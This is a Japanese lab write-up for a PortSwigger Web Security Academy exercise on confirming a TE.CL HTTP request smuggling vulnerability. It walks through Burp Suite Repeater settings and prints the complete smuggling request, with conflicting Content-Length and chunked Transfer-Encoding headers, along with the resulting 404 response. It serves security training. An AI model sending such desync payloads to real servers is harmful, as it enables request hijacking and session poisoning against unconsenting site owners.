# HTTP リクエストの密輸、差分応答による TE.CL の脆弱性の確認

次のハッキングラボを実施します  
https://portswigger.net/web-security/request-smuggling/finding/lab-confirming-te-cl-via-differential-responses  
このラボにはフロントエンドサーバーとバックエンド サーバーが含まれますが、バックエンドサーバーはチャンク エンコーディングをサポートしていません。

- 1. Burp Suite を起動して、proxy タブからブラウザを立ち上げます

* 2. ブラウザからハッキングラボにアクセスします

- 3. GET / リクエストを send to repeater します
- 4. Repeater のリクエストを表示した状態で右クリックして change to request を選択して、POST リクエストに切り替えます

* 5. Setting で Repeater の Update content length のチェックボックスを外します
     ![1](https://github.com/pea-sys/web-security-experiments/assets/49807271/8b1031a6-e20f-4f61-b906-8b54d6d8a882)

* 6. リクエストを以下のように書き換えて 2 回送信します

```
POST / HTTP/1.1
Host: 0a3f007e04997411800d589400b200f7.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-length: 4
Transfer-Encoding: chunked

5e
POST /404 HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 15

x=1
0

```

2 回目のレスポンス

```
HTTP/1.1 404 Not Found
Content-Type: application/json; charset=utf-8
Set-Cookie: session=LWZFHsViAmfaqg4cn05Igbl8JyZenK2j; Secure; HttpOnly; SameSite=None
X-Frame-Options: SAMEORIGIN
Connection: close
Content-Length: 11

"Not Found"
```

バックエンドは最初のリクエストで Se まで処理し、それ以降は別のリクエストとして POST /404 を処理します。
次回リクエストで、それに対する応答を返します。
